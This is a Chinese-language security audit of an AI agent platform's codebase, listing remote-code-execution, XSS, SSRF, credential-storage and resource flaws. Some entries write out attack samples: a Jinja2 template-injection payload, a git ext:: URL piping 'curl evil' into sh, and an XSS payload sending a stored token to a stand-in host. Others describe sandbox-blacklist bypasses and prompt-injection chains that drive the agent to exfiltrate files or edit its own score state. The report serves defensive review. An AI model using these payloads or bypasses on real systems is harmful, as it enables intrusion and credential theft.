# andy-harness 全项目代码体检报告

- **体检日期**：2026-10-12
- **项目版本**：v1.0.0（工作树含未提交改动，本次体检基于当前磁盘状态）
- **体检对象**：`H:/jsd-andyharness/src` 全部有效源代码

---

## 一、执行摘要

本次体检由 5 路并行深度代码审查（核心层 / 业务模块 / API 层 / 插件层 / 前端与桌面端）+ 安全自动化扫描（硬编码密钥、危险函数、SQL 注入、SSRF、XSS、路径穿越）+ 关键论断抽样实测验证三部分组成。

**核心结论**：项目工程化基建与核心 Agent 逻辑质量显著高于同类个人项目；主要短板集中在 **安全攻击面**（4 条独立的远程代码执行链、凭据明文存储、XSS、SSRF、越权面）与 **资源管理**（上下文管理热点、数据库串行化、连接管理、背压缺失）。共确认 **7 项 P0、16 项高危、约 35 项中危、约 30 项低危**问题。综合健康度 **70/100**，定位为「基建优秀、核心扎实，安全与资源管理需优先补强」。

**最紧急事项（建议 48 小时内处置）**：

1. **轮换 OortCloud access_token** —— `backend/data/integration_hub/oortcloud_state.json` 中以明文存有 live token（文件权限 644，且该值已出现在本次会话记录中），建议立即在 OortCloud 侧断开重连使旧 token 失效（该文件已被 .gitignore，无仓库泄露）。
2. 封堵 4 条 RCE 链（详见 SEC-02 ~ SEC-05）。
3. 修复 MarkdownRenderer XSS（SEC-06）与计算器 DoS（SEC-01）。

---

## 二、体检范围与方法

| 项 | 内容 |
|---|---|
| 代码规模 | 370 个源文件，约 54,000 行（后端非测试 31,058 行 Python；测试 15,626 行；前端 22,872 行 TS/Vue；桌面端 135 行 Rust + 启动器） |
| 已排除 | `.venv` / `node_modules` / `.git` / `__pycache__` / `.pytest_cache` / `e2e/` 测试桩 / `data` `workspace` `logs` 运行时产物 / 二进制资源 |
| 审查方式 | 五路并行全量通读 + grep 模式扫描（密钥、`eval/exec`、`shell=True`、SQL 拼接、危险导入）+ 对代理结论逐条抽样实测（含真实数据库查询验证） |
| 质量门禁现状 | ruff + mypy + pytest（74 个测试文件）+ eslint + vitest + prettier + pre-commit + GitHub Actions 全链路 CI，配置完善 |
| 说明 | 测试代码未逐行审查（属"测试桩"排除范围），但其存在与 CI 全绿为本次修复提供了回归安全网 |

---

## 三、问题清单（按模块归类）

> 严重程度：高 / 中 / 低；优先级：P0（立即，1–2 天）/ P1（本周）/ P2（排期迭代）/ P3（记录备查）。
> 编号规则：SEC=安全横向，CORE=核心层，MOD=业务模块，API=接口层，PLG=插件层，FE=前端桌面，ARC=架构跨层。

### 3.1 安全与敏感信息专项（横向，最高优先级）

#### SEC-01 【高｜P0】计算器工具 DoS（LLM 可控入参）
- **位置**：`backend/harness/engine/builtin_tools.py:28-31, 89`；`backend/marketplace/tool_calculator/main.py:65-66`
- **问题**：`ast.Pow` 无任何数值/规模上限，模型被诱导输入 `2**999999999` 即触发大整数幂运算。
- **影响**：进程挂死或内存耗尽（GIL 无法中断），整个后端不可用。属"一次对话即可打死服务"的可用性漏洞。

#### SEC-02 【高｜P0】插件安装端点 = 任意代码执行 + 路径穿越
- **位置**：`backend/harness/api/rest/plugins.py:124-188`（`/api/plugins/install`）、`:287-314`（`/install-external`）
- **问题**：① `install` 接受调用方提交的 `plugin_code`（任意 Python 源码）写入 `main.py` 并立即 `loader.load()` + `activate()`；② `install-external` 的 `plugin_id` 取自 zip 内 `plugin.json`，未校验 `../`，`_PLUGINS_DIR / plugin_id` 可穿越到任意路径写盘。
- **影响**：认证启用时任一登录用户即可获得服务器 RCE；认证未启用（默认模式）时任何能访问端口的人均可。文档自述"插件系统按完全信任设计"，但 HTTP 面缺乏对应隔离。

#### SEC-03 【高｜P0】工作流表达式 SSTI → RCE（模板分享链）
- **位置**：`backend/harness/modules/workflows/engine.py:506-516`；分享面 `templates_hub/service.py:405-444`、`api/rest/templates_hub.py`
- **问题**：`jinja2.from_string(f"{{{{{expr}}}}}")` 中 `expr` 来自上游节点输出（Webhook body / 常量 / LLM 输出），未过滤。`jinja2.Environment` 未沙箱化，`{{cycler.__init__.__globals__.os.popen('...').read()}}` 可直接执行 shell。
- **影响**：导入一份来源不可信的工作流模板（或让 agent 处理一份恶意 Webhook/网页）即 RCE。这是全项目最危险的注入链——攻击载体是"数据"而非"代码"。

#### SEC-04 【高｜P0】devkit scaffold 名称注入生成恶意插件源码
- **位置**：`backend/harness/modules/devkit/service.py:274-330`（f-string 直插 `name`/`description`/`entry` 进生成的 Python 源码）；路由层 `api/rest/devkit.py:38-55` 无过滤
- **问题**：`name` 含双引号或反斜杠即可闭合字符串字面量，注入任意 Python 代码；生成的 `main.py` 随后被 loader 导入执行。
- **影响**：生成并加载一个插名即可 RCE。与 SEC-02 同族但更隐蔽（走"代码生成"而非"代码提交"）。

#### SEC-05 【高｜P0】package_installer `git ext::` URL → 安装时 RCE
- **位置**：`backend/harness/modules/package_installer/service.py:161-180`（URL 白名单只做子串包含检查）；同文件 `:113-120`（`install_from_url` 无大小上限、scheme 未限）
- **问题**：`https://gitlab.com/foo.git` 之外的 URL 只要**包含**白名单子串即通过，如 `https://gitlab.com/x#ext::sh -c "curl evil|sh"` 实际执行 `git clone` 时 `ext::` 远程助手直接执行命令。`install_from_url` 另可 `file://` 读本地、无限流下载打满磁盘。
- **影响**：安装一个"技能/工具包"即 RCE；同文件 SSRF + 磁盘耗尽。

#### SEC-06 【高｜P0】MarkdownRenderer XSS（前端头号安全问题）
- **位置**：`frontend/src/components/MarkdownRenderer.vue:8-27`
- **问题**：markdown-it 以 `html: true` 初始化并直接 `v-html` 渲染，全项目无 DOMPurify 或任何消毒；`linkify: true` 额外自动链接化。
- **影响**：LLM 输出 / web_fetch 抓取的网页内容 / 上传文档中若含 `<img src=x onerror="fetch('//evil/'+localStorage[token])">`，即可在页面上下文执行并窃取 localStorage 中的 Bearer token（`api/token.ts` 明文存 token）。攻击链完整：提示注入 → 恶意输出 → token 外泄。桌面端叠加 Tauri `csp: null`（FE-04）后后果进一步放大。

#### SEC-07 【高｜P1】computer_use 安全围栏可被系统性绕过
- **位置**：`backend/plugins/computer_use/safety.py:72-109`；`plugins/computer_use/agent.py:624-630`
- **问题**（四重缺陷，实测确认）：
  1. `command_exec` **完全不受 `deny_paths` 作用域约束**——`cat ~/.ssh/id_rsa`、`type ...\secrets.txt` 不在命令黑名单即可读取任意文件，内容经文本/截图回灌 LLM，构成任意文件外泄通道；
  2. `deny_commands` 为子串黑名单，`rm -rf` 可经 `rm -r -f`（已被空白归一化部分缓解）、解释器、编码、环境变量拼接等方式绕过；黑名单范式本身不可收敛；
  3. `_check_scope` 用字符串 `startswith` 前缀匹配而非路径边界比较——工作目录 `/data/computer_use_workspace` 会被 `/data/computer_use_workspace-evil/x` 绕过；
  4. 白名单放行 `python`/`node` 等解释器等同于放权（`python -c "import os; os.system(...)"`）。
- **影响**：该插件以"无人值守安全模式"为卖点，实际围栏可被普通提示注入击穿。

#### SEC-08 【高｜P1】computer_use 审批接口可自授且无管理员门禁
- **位置**：`backend/plugins/computer_use/main.py:111-116, 251-256`
- **问题**：`approve_run(run_id)` 对**任意** run_id（含不存在的）恒返回 `True` 并加入 `approved_runs`；`/api/computer-use/approve` 路由无 `require_admin` 依赖。默认认证关闭模式下，任何可达端口的调用方均可授权。
- **影响**：interactive 模式"人工授权整个任务"的安全承诺可被远程自助兑现，授权的是本机任意 shell 执行权。

#### SEC-09 【高｜P1】OortCloud access_token 明文落盘（线上有效）
- **位置**：`backend/plugins/integration_hub/oortcloud_provider.py:155-160`（`_save_state` 直接 `json.dump`）；`backend/data/integration_hub/oortcloud_state.json`
- **问题**：用户级 `access_token`/`state` 明文写入状态文件，无 `chmod 600`、无加密。讽刺的是**同一体系内** provider 的 API Key 走了 `APIKeyEncryptor` Fernet 加密（`:454`），OAuth token 却不加密——双重标准。体检实测盘上存在 live token（权限 644）。
- **影响**：同机其他用户/进程可读取并获得 OortCloud 账号（该账号 `unlimited_quota=true`）的完整访问权。**已出现在本次会话记录中，建议立即轮换。**

#### SEC-10 【高｜P1】Feishu 凭据（app_secret / token / webhook_secret）明文落盘
- **位置**：`backend/plugins/integration_hub/feishu_provider.py:194-215`（`_save_state`）；状态文件 `backend/data/integration_hub/feishu_state.json`
- **问题**：`app_secret`、`token`、`webhook_secret` 明文 JSON 落盘，无权限收紧（对比 `auth_manager` 的 `auth_secret.txt` 有 `chmod 600`，项目内标准不一致）；且写入非原子（崩溃可写坏半截 JSON）。源码 docstring 自述"与 permission.json 同级风险"但无任何缓解措施。
- **影响**：同 SEC-09。飞书应用 secret 泄露 = 应用身份被冒用。

#### SEC-11 【高｜P1】web_fetch 工具 SSRF
- **位置**：`backend/plugins/tool_web_fetch/main.py:66-85`
- **问题**：仅校验 scheme 与 netloc 非空；不解析/不拦截内网、环回、链路本地地址（`127.0.0.1`、`169.254.169.254` 云元数据、`10.*`、`192.168.*`）；`follow_redirects=True` 且不校验跳转后目标；`resp.text` 无响应大小上限（`max_length` 仅截断**展示**，下载已全量入内存）。
- **影响**：提示注入可驱动 agent 探测/读取内网服务与云凭证，或将大响应灌入内存。

#### SEC-12 【高｜P1】Feishu Webhook 发送 SSRF
- **位置**：`backend/plugins/integration_hub/feishu_provider.py:1262-1298`（`send_webhook`）；调用点 `:938-939`
- **问题**：`webhook_url` 为用户自填且无任何校验（无 host 白名单、无 scheme 限制），在未认证状态下即可经 `POST /api/integrations/feishu/call` 的 `send_webhook` 动作触发；请求体用户可控。
- **影响**：任意 URL POST + 部分响应内容回显 = 内网探测/数据外发通道；同时是开放邮件/消息炸弹面。

#### SEC-13 【高｜P1】Skill / Provider 写端点缺失管理员校验
- **位置**：`backend/harness/api/rest/skills.py:104, 151, 176, 211, 259`（reload / 市场安装 / 外部安装 / 卸载 / 启停）；`backend/harness/api/rest/providers.py:101, 110, 133, 153, 198`（创建/改密钥/删除/连接测试）
- **问题**：上述端点均无 `Depends(require_admin)`。`deps.py:15-33` 的 `require_admin` 在认证启用时才生效（认证关闭时按设计放行），因此该问题在**启用多用户认证后**即刻显形：普通登录用户可装卸技能、读写 provider 密钥。
- **影响**：越权管理面；配合 SEC-05 的 install-external 即普通用户 RCE。

#### SEC-14 【高｜P1】渠道入站默认无认证 + 用户身份伪造
- **位置**：`backend/harness/modules/channel_manager/service.py:115-117`；`backend/harness/api/rest/channels.py:80-98`
- **问题**：`check_secret` 实现为 `not self.secret or provided == self.secret`——**未配置 secret 时无条件放行**（fail-open），且此时信任 `X-Channel-User-Id` 请求头，可伪造任意用户身份（含 admin）向 agent 下发指令；`==` 字符串比较存在时序侧信道。`/api/channels/inbound/` 被认证中间件显式豁免（`middleware/auth.py:34`），是唯一全局豁免的入站面。
- **影响**：默认配置下，任何知道 URL 的人可以任意用户身份驱动 agent（含触发高危工具）。

#### SEC-15 【高｜P1】MCP 客户端三重资源管理缺陷
- **位置**：`backend/harness/modules/mcp_client/service.py:278-310`（stderr=PIPE 无人读）、`:354-357`（readline 无上限）、`:788-800`（启动失败不 terminate）
- **问题**：① 子进程启动失败路径未 `terminate()` → 僵尸进程累积（多 server 场景）；② `stderr=PIPE` 无消费者，子进程 stderr 写满 64KB 缓冲区即死锁挂起；③ `stdout.readline()` 无长度上限，恶意/失控 server 单行输出可打满内存；④ 每个 stdio server 占用 2 条 TCP 连接，上限 ~1024 后端口耗尽且**不级联清理**。
- **影响**：长时间运行后服务缓慢死亡（僵尸+端口泄漏），或单行输出 OOM。

#### SEC-16 【高｜P1】飞书 CLI 子进程无超时 + WS 协程互踩
- **位置**：`backend/plugins/integration_hub/feishu_provider.py:76-79, 174`（`_run_cli` timeout=None）；`:866-889`（挂起期间 `receive_text` 并发调用）
- **问题**：CLI 子进程无超时，进入交互等待（如账号选择、权限提示）即永久挂起；挂起期间其他协程（stop、重连）对同一 WebSocket 调用 `receive_text()`，两个协程并发接收损坏连接状态机，错误信息极具误导性。
- **影响**：一次卡死的 CLI 调用可持久拖死飞书渠道连接；排查成本高。

#### SEC-17 【高｜P1】Provider 流式重试内容重复（数据正确性）
- **位置**：`backend/harness/modules/model_manager/openai_compatible.py:143-224`
- **问题**：含工具调用的轮次重试时，已流式产出并推给前端的文本再次全量发送（无增量游标）；且重复内容**不被持久化**，刷新后与库中记录错位。DeepSeek/OpenRouter 首 token 30–120s 的超时设定使该路径成为常态而非边缘。
- **影响**：用户看到重复文本；历史记录与实时展示不一致。

#### SEC-18 【高｜P1】memory_manager 向量检索性能退化
- **位置**：`backend/harness/modules/memory_manager/service.py:376-400`（`_ensure_schema` 在查询热路径）、`:211-248`（Python 侧逐条解码 embedding JSON）
- **问题**：① `_ensure_schema`（20+ 列存在性检查 + ALTER）跑在每次查询路径；② 相似度计算在 Python 侧对全量 memory 逐条 `json.loads` 解码 embedding——每次 `render_hint`/`recall` 约 7,200 次解码，20 个会话即约 14.4 万次；无缓存、无上限、无增量。
- **影响**：会话数增长后记忆检索成为后端最慢路径之一，且直接拖慢每一轮对话。

#### SEC-19 【高｜P1】scheduler 同步 HTTP 阻塞事件循环
- **位置**：`backend/harness/modules/scheduler/service.py:558-582`；`modules/scheduler/runner.py:31-33`
- **问题**：`run_task_now` 用同步 `requests.post` 等工作流/入站 Webhook 返回，直接阻塞 uvicorn 事件循环。
- **影响**：一个慢/挂起的定时目标（本机服务未起、webhook 不通）可卡死整个后端所有请求与 WebSocket。

#### SEC-20 【高｜P1】session fork 竞态 + 全量重写
- **位置**：`backend/harness/modules/session_manager/service.py:359-407`
- **问题**：检查→拷贝→删源三步间无锁，并发 fork 双花 message id；fork 对每条消息 read + write 相同 JSON，500 条消息即 1000 次序列化。
- **影响**：数据完整性（消息覆盖/丢失）；大会话 fork 明显卡顿。

#### SEC-21 【高｜P1】OortCloud 授权令牌"直通"不回填
- **位置**：`backend/plugins/integration_hub/oortcloud_provider.py:311-356, 467-475`
- **问题**：access_token 只存集成状态文件，provider 行只存派生的 API Key。换取新密钥后原 access_token 失效 → provider 连接测试失败；用户换浏览器/清 Cookie 后无恢复路径。另观察到 `remaining_credits=-18` 与 `unlimited_quota=true` 并存，账号可能已欠费停用（直通模式下测试接口不报错、只有真实模型调用失败）。
- **影响**：集成在边界场景下静默失效，故障表象（401）与根因（token 过期）分离，排查困难。

#### SEC-22 【高｜P1】tool_file_manager 默认工作目录 = `Path.cwd()`
- **位置**：`backend/marketplace/tool_file_manager/main.py:148`（`_base_dir` 默认 `Path.cwd()`）；同文件 `:156-165`（工作区路径可指定）
- **问题**：未显式配置 `base_dir` 时，以**后端进程当前工作目录**为根。uvicorn 从仓库根启动时该值即整个项目树；`_safe_join` 只做前缀包含检查。
- **影响**：该插件全项目无调用方配置 `base_dir`（`plugins/__init__.py:22` 与 loader `:341-348` 均未传），等于默认开放后端视角下的全盘文件管理。

#### SEC-23 【中｜P1】sandbox "禁网"名不副实 + invoke 环境变量未校验
- **位置**：`backend/harness/modules/sandbox_manager/service.py:187-201`（仅命令黑名单）、`:422-432`（`invoke()` 裸传 env）
- **问题**：`deny_network` 只过滤 shell 命令里的 curl/wget/invoke-webrequest，不阻断 Python `urllib/requests`、.NET、Socket；且只匹配命令行第一个 token（`python -c "import urllib..."` 直接穿透）。`tools.invoke()` 直传调用方 env，可带 `PYTHONPATH` 劫持解释器（`_make_safe_env` 只作用于 shell 路径）。
- **影响**：沙箱的网络隔离与执行隔离均可被轻易绕过。

#### SEC-24 【中｜P1】读-改-全量覆盖写状态文件，无原子性无文件锁（跨模块共性问题）
- **位置**：`permission_manager/service.py:134-153`、`skill_manager/service.py:367-390`、`mcp_client/service.py:676-692`、`memory_manager/summarizer.py:63-78`
- **问题**：四类配置文件均"读全量 JSON → 改 → 整体写回"，无临时文件+rename、无 flock。并发请求丢失更新；进程在写一半时崩溃留下损坏 JSON（多处 `except: return {}` 静默吞掉后**用空配置覆盖**，造成二次损坏）。
- **影响**：权限规则/技能开关/MCP 配置/压缩历史在并发或崩溃后静默丢失——安全相关状态尤甚。

#### SEC-25 【中｜P1】会话/记忆数据隔离仅存在于应用层
- **位置**：`backend/harness/infra/repository.py:369-387, 456-463`；`permission_manager/audit.py:23-35, 83-86`
- **问题**：所有 SQL 按 `session_id` 过滤而无 `user_id` 条件；越权防护完全依赖 API 层一次 `get_session(session_id, user_id=...)` 检查，存储层不设防。WebSocket 路径（`api/ws/chat.py`）亦不做归属校验。
- **影响**：任何一处 API 漏校验即越权读写全库数据；审计查询与 span 查询可跨用户。

#### SEC-26 【中｜P1】jev 三件套可被提示注入驱动作弊
- **位置**：`backend/plugins/tool_jev_score/main.py:26-48`、`tool_jev_noul/main.py:26-46`、`tool_jev_choice/main.py:26-46`
- **问题**：`jev_score`/`jev_noul`/`jev_choice` 直接读写持久化评测状态（`self.ctx.config`），无人工确认、无操作审计。网页/文档中的注入指令可让 agent 自行修改评测道具状态。
- **影响**：持久化状态被未授权篡改；属"agent 可改自己的记分牌"类设计缺陷。

#### SEC-27 【中｜P1】computer_use 自带两个围栏外通道
- **位置**：`backend/plugins/computer_use/agent.py:322-346`（`code_execute` 裸 Python REPL）、`:646-657`（`_write_file` 自带实现）
- **问题**：① `code_execute` 是内置 `compile`+`exec` 的 Python REPL，**完全不经 safety.py**，白名单/deny 一概不适用，等价于直接 shell；② `safety.py` 只围栏 `file_write` 工具，agent 自带的 `_write_file`（file_write 的内部实现路径之一）无作用域检查。
- **影响**：安全围栏存在两条平行绕过通道，`approval_mode` 对它们无效。

#### SEC-28 【中｜P1】登录无速率限制 + 用户名枚举
- **位置**：`backend/harness/api/rest/auth.py:57-101`
- **问题**：无失败锁定/验证码/限流；配合 PBKDF2 20 万次迭代成为 CPU 放大器（并发登录打满 CPU）；用户不存在时直接返回（无哈希计算）与存在时（有 20 万次迭代）存在可测时序差，可枚举用户名。
- **影响**：认证启用后可在线爆破；未启用时仍是 CPU DoS 面。

#### SEC-29 【中｜P1】附件大小校验滞后（内存 DoS）
- **位置**：`backend/harness/api/rest/attachments.py:92-121`
- **问题**：循环内 `f.read()` 全量读入后才与 `MAX_IMAGE_SIZE`/`MAX_DOCUMENT_SIZE` 比较并截断——限制只作用于**落盘**，不阻止读入内存。数量校验已前置（P1-4 修复过），大小校验没有。
- **影响**：单次上传数个数百 MB 文件即可堆出服务端内存峰值。

#### SEC-30 【中｜P1】WebSocket 无背压 + 断开后僵尸 run
- **位置**：`backend/harness/api/ws/chat.py:538-562`
- **问题**：单条消息在连接间触发最多 4 次 `send_json`（流式直推、停止确认、事件广播、run 列表广播）；客户端不读/网络慢时 `send_json` 内部缓冲无限膨胀（OOM）；客户端断开后 `run_task` 协程继续跑完，持续消耗模型 token。
- **影响**：恶意/故障客户端可 OOM 服务端；断连烧钱。

#### SEC-31 【中｜P1】定时任务端点缺管理员与归属校验
- **位置**：`backend/harness/api/rest/schedules.py:96-141`
- **问题**：`run-now`、`update`、`delete` 无 `require_admin`、无 `user_id` 归属过滤——任何登录用户可触发/改写/删除他人任务；`list_tasks` 返回全部任务。
- **影响**：越权触发工作流（消耗 token）、篡改排期。

#### SEC-32 【中｜P1】API Key 泄露进错误消息与日志
- **位置**：`backend/plugins/integration_hub/oortcloud_provider.py:279-286, 407`；`backend/plugins/tool_memory/main.py:40-42`；`backend/plugins/tool_web_fetch/main.py:146`（同类模式）
- **问题**：① OortCloud 连接失败时把含完整 API Key 的原始错误拼进 `AuthResult.error` 并 `logger.exception` → 500 detail 直接回显客户端 + 落 error 日志；② `tools_memory` 的 `render_hint` 把 memory 值（可能含密钥）全量打 info 日志；③ 同类模式见 `api/rest/plugins.py:182/279/350`。
- **影响**：密钥经 HTTP 响应/日志双通道泄露；`mask_api_key` 工具存在却未在这些路径使用。

#### SEC-33 【中｜P1】scheduler 重启风暴：重置所有错过任务
- **位置**：`backend/harness/modules/scheduler/service.py:490-491`
- **问题**：`load_pending_tasks` 对**所有** `next_run_at < now` 的任务无条件置为立即执行——无 missed-run 策略（丢弃/补跑次数上限/退避）。服务器重启错过 720 个日任务 → 重启后全部立即触发。
- **影响**：重启即任务海啸（token 配额瞬间打爆）；`scheduled_task_runs` 无 missed 记录可供审计。

#### SEC-34 【中｜P2】其余安全项（归纳）
| 位置 | 问题 | 影响 |
|---|---|---|
| `harness/infra/crypto.py:89-103` | Fernet 密钥 = 无盐 SHA-256(machine_id)；MachineGuid 任何本机用户可读，非机密输入 | 加密仅防"文件被拷到别的机器"，不防本机攻击者；确定性密钥 |
| `harness/main.py:286-298` | CORS `allow_origin_regex=localhost:*` + `allow_credentials=True` | 本机任意端口可发起带凭据请求 |
| `harness/api/ws/chat.py:227-246` | WS token 走 query string（落入访问日志）；accept 先于鉴权 | 令牌进日志文件 |
| `plugins/channel_telegram/main.py:31-48, 88-121` | bot_token 明文 + fail-open 校验 + 401 时泄露 token | 同 SEC-09/14 模式 |
| `plugins/tool_ip_lookup/main.py:28-48` | 客户端 IP 送第三方 + URL 用户可控 | 隐私泄露 + SSRF |
| `marketplace/tool_file_manager/main.py:104-117, 129-140` | mkdir/copy 仅 `deny_paths` 字符串前缀 | 前缀绕过（同 SEC-07-3） |
| `plugins/computer_use/config.py:68` | `allow_desktop` 默认 True | 默认配置直接授予桌面控制权 |
| `harness/kernel/loader.py:117-146` | core_api 版本区间校验"无法解析则放行" | 恶意/损坏 manifest 绕过兼容性检查 |
| `plugins/integration_hub/feishu_provider.py:60-63` | 硬编码 `F:\tools\larkcli` 个人路径 | 可移植性 + 暗示机器特定配置外泄 |

---

### 3.2 后端核心层（kernel / infra / engine / main）

#### CORE-01 【中｜P1】权限与隔离逻辑内嵌引擎层
- **位置**：`harness/engine/agent_loop.py:583-599`（`_check_permission`）、`:640-643`（`_check_session_isolation`）
- **问题**：安全判定住在执行引擎里，未经独立契约/测试；`_check_permission` 在服务异常时 **fail-open**（记录 error 后返回 None 放行）——源码注释自认"已放行"。
- **影响**：权限服务故障时高危工具静默执行；逻辑难以单测与复用。

#### CORE-02 【中｜P1】数据库单共享连接 + RLock 全串行
- **位置**：`harness/infra/database.py:337-366`；`harness/infra/repository.py:240`
- **问题**：单连接 + `threading.RLock` 使所有查询（含同步 `execute`）串行化，慢查询阻塞全后端；`repository.py:240` 的非事务 `begin()/commit()` 之间不持锁，与其他线程交错。
- **影响**：并发场景（WS 聊天 + 定时任务 + 洞察查询）下延迟叠加；SQLite 写锁争抢。

#### CORE-03 【中｜P1】agent_loop 每轮全量重建上下文
- **位置**：`harness/engine/agent_loop.py:217-224`
- **问题**：每个工具迭代轮都重新拉全量消息 + 逐条 `count_tokens` + 重算压缩 + 持久化快照，无增量缓存（与 MOD-01 叠加）。
- **影响**：长会话每轮成本随历史线性增长；直接推高 token 费用与延迟。

#### CORE-04 【中｜P1】停止时流式 async generator 未闭环
- **位置**：`harness/engine/agent_loop.py:806-809`
- **问题**：模型流中途 `break` 后 generator 靠 GC 关闭（`athrow` 需进入事件循环），连接可能悬挂至超时。
- **影响**：停止按钮后后端仍占用上游连接数。

#### CORE-05 【中｜P2】其余核心层问题（归纳）
| 位置 | 问题 | 影响 |
|---|---|---|
| `engine/agent_loop.py:446-459` | 重试策略对全异常指数退避（含 4xx/内容审核） | 每次 3 次重试放大配额消耗 |
| `engine/agent_loop.py:231-247` | 迭代上限硬编码 40，不可配置 | 复杂任务被静默截断 |
| `engine/agent_loop.py:531-536` | 工具结果 100K 字符截断仍超多数模型上下文 | 下游调用失败 |
| `engine/agent_loop.py:802-806` | 停止标志未传 `_call_model`，最坏多跑一整轮 | 停止响应延迟 |
| `engine/builtin_tools.py:114-138` | 当前时间工具不支持 IANA 时区 | 时区相关输出错误 |
| `kernel/loader.py:150-173` | `importlib.import_module` + `sys.path.insert(0, plugins 父目录)` | 本地任意模块可被导入；plugins 目录可影子劫持标准库名（本地信任模型下属中危，但与 SEC-02 叠加后严重） |
| `kernel/loader.py:327-348` | `_persist_config` 覆盖写：单插件配置持久化覆盖其他插件配置 | 配置互相踩踏 |
| `kernel/loader.py:338-348` | `deactivate()` 无条件 pop 共享服务（ToolRegistry/EventBus 等），后 deactivate 的插件清掉别人的服务 | 插件顺序敏感故障 |
| `kernel/services.py:66-78` | `unregister` 弹出栈顶而非指定 owner 的实现 | 多实现时错摘 |
| `kernel/eventbus.py:58-79` | 热路径持 RLock 逐个 await handler | 一个慢 handler 阻塞所有发布 |
| `kernel/hooks.py:222-230` | 同步 handler 收 `(ok, err)` 两个位置参直接 TypeError | 契约漂移即崩溃 |
| `infra/repository.py:466-487` | `SecretStore.store_secret` 恒抛异常（死代码） | 秘密实际从不走安全存储 |
| `infra/repository.py:381-384` | 消息持久化循环内逐条 `commit()` | 20 条消息 = 20 次 fsync |
| `infra/security.py:22` | PBKDF2 200k 低于 OWASP 600k 建议 | 离线爆破成本降低 |
| `infra/security.py:91-92` | `int(claims.get("exp", 0))` 在 try 之外，非数字 exp 抛未捕获异常 | 畸形 token 打崩中间件 |
| `main.py:159-167` | `ToolRegistry`/`PluginLoader`/`Database` 等重复注册无幂等保护（EventBus/HookManager 有 `if not has` 守卫，其余没有） | `_init_components` 二次调用时服务栈无限增长 |
| `main.py:273-278` | lifespan 仅 catch 插件目录激活失败即 `raise` | 单个坏插件阻断启动 |
| `main.py:71-88` | `.env.local` 代理配置用 `split("=", 1)` 粗解析 | 格式错误时静默错配 |

---

### 3.3 后端业务模块（modules/）

#### MOD-01 【高｜P0】context_manager 缓存击穿（全项目最重要性能缺陷）
- **位置**：`backend/harness/modules/context_manager/service.py:59-67, 188-194, 234-238`
- **问题**：`build()` **开头**就 `invalidate_cache(session_id)`，紧接着读缓存——缓存命中率恒为 0。于是每条消息触发 2 次全量上下文重建（会话 build + 子 agent build），每次包含全量消息拉取 + 逐条 token 计数 + 压缩判定 + 快照持久化；`_render_markdown` 还对每条消息全文再跑 2 次。
- **影响**：直接乘以每一轮对话的延迟与 token 成本——这正是项目最关注的成本痛点。修复方向：失效时机改为"写入后"而非"读取前"，并将 `_render_markdown` 从每消息路径移到一次性预处理。

#### MOD-02 【高｜P1】session mark_stopped 整列重写
- **位置**：`backend/harness/modules/session_manager/service.py:461-472`
- **问题**：为标记"已停止"读入全部消息、改一列、整列写回。
- **影响**：长会话（千条消息）每次停止都产生全量序列化 + 大文本列重写，CPU/GC 压力显著。

#### MOD-03 【高｜P1】会话搜索全表扫描 + 假分页
- **位置**：`backend/harness/modules/session_manager/service.py:509-524`
- **问题**：`LIKE '%kw%'` 全表扫描（`content`/`title` 无 FTS 索引）+ Python 侧二次过滤（messages JSON 逐个 `json.loads`）+ 上限 500 截断——`limit`/`offset` 是切片参数而非真分页。
- **影响**：消息量增长后搜索线性劣化；大结果集重复序列化。

#### MOD-04 【高｜P1】subagent 缺 `subagent_id` 维度，隔离全部失效
- **位置**：`backend/harness/modules/subagent/service.py:294-324`
- **问题**：events / spans / evals / memory 的 user 过滤只认 `user_id`/`session_id`，没有 `subagent_id`——子 agent 可读取父会话的全部历史与事件。
- **影响**：子 agent 隔离承诺落空；上下文意外膨胀。

#### MOD-05 【中｜P2】其余业务模块问题（归纳）
| 位置 | 问题 | 影响 |
|---|---|---|
| `modules/subagent/service.py:346-359` | registry 无同步/恢复机制 | 重启后子 agent 失联（僵尸 run） |
| `modules/memory_manager/service.py:133-135` | update 后 stale 缓存最多存活 60s | 短暂读写不一致 |
| `modules/memory_manager/embedding.py:145-156` | embed 失败返回 128 维零向量并入库 | 零向量造成假匹配 + 维度污染 |
| `modules/memory_manager/service.py:416-420` | `render_hint` 每次调用都现场 embed（阻塞 HTTP 请求） | 每轮对话追加 embedding 延迟 |
| `modules/scheduler/service.py:40, 89-92, 180` | `datetime.utcnow()` naive 与库内 aware 时间比较 | 错过执行判定漂移（DST/时区） |
| `modules/scheduler/service.py:213-223` | `mark_started` 吞掉 DB 异常返回 False | 崩溃任务可被重入触发 |
| `modules/scheduler/service.py:120-149` | `run_workflow` 静默吞掉 skipped/failed 仍标记 success | 假成功执行记录 |
| `modules/tracing/service.py:129-136` | span hash 仅 8 位十六进制 | 同秒同工具不同参数塌陷同一 span |
| `modules/tracing/service.py:209-216` | events 磁盘满才报错 + 慢消费者阻塞 publish | 观测数据丢失 + 反压主链 |
| `modules/insights/builtin_metrics.py:43-47` | 函数内循环引用导入 | 脆弱导入序 |
| `modules/insights/service.py:110-190` | 时间口径不一致（`substr` 按 UTC vs `datetime(...,'localtime')`）**（实测修正：SQLite 3.38+ 可正确解析 ISO-8601 T+时区格式，原"统计静默归零"判断不成立，降级为一致性问题）** | 不同图表时区口径不一致 |
| `modules/insights/service.py:254-262` | `get_summary_documents` 分类后不过滤 | 摘要 token 无限膨胀 |
| `modules/insights/service.py:277-281` | 只按 name 聚合丢弃 version/owner | 版本统计失真 |
| `modules/package_installer/service.py:90` | `pip install --target .` 装进 `.venv` | 包进版本库/构建产物 |
| `modules/package_installer/service.py:275` | Windows `shutil.which(None)` 传 None 崩溃 | 可用性 |
| `modules/workflows/engine.py:37-58` | `NodeInput`/`NodeResult` 重复定义三份 | 类型漂移 |
| `modules/workflows/engine.py:87` | 节点串行执行无并行调度 | 独立分支无法并行（终止性已实测验证无死循环） |
| `modules/workflows/engine.py:671-677` | `require_human_approval` 仅记录非强制 | 审批门禁落空 |
| `modules/permission_manager/service.py:16-51` | `shell_execute` 在 `list_tool_risks()` 枚举中但不在 `_TOOL_RISKS` | 灰名单规则永不生效 |
| `modules/permission_manager/audit.py:75-112` | 审计写入与业务操作非同一事务 | 崩溃时审计与行为不一致 |
| `modules/todo_manager/service.py:336-360` | 每步 `commit()`（N+1 fsync） | 批量操作慢 |
| `modules/todo_manager/service.py:283-312` | move 接受无效 position 静默成功 | 重复 position 打乱排序 |
| `modules/todo_manager/service.py:383-390` | `clear_todos` 删已删除会话返回 false | 假阴性 |
